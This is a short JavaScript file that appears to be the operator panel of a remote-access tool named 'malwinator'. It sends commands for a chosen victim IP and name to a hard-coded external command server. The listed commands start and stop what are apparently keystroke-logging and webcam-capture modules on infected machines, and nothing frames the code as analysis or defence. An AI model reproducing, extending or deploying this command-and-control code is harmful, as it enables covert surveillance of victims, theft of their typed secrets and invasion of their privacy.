// uri = "http://localhost:5000"
uri = "https://malwinator.chickenkiller.com"
// uri = "http://malwinator.chickenkiller.com"

function sendCommand(command) {
    path = "/send"
    const result = document.getElementById('commandResult');
    const formData = new FormData();
    
    formData.append("ip", ip);
    formData.append("name", name);
    formData.append("command", command);

    fetch(uri + path, {
        method: "POST",
        body: formData
    })
        .then(response => {
            return response.text();
        })
        .then(text => {
            if (text == '1')
                result.textContent = "Failed to send command!";
            else 
                if (command == 'log' || command == 'camera')
                    result.textContent = "Command sent! (waiting for data ...)";
                else if (command == 'end log' || command == 'end camera')
                    result.textContent = "Module stopped!";
                else 
                    result.textContent = "";

        })
        .catch(error => {
            console.error('Error', error);
        })
}

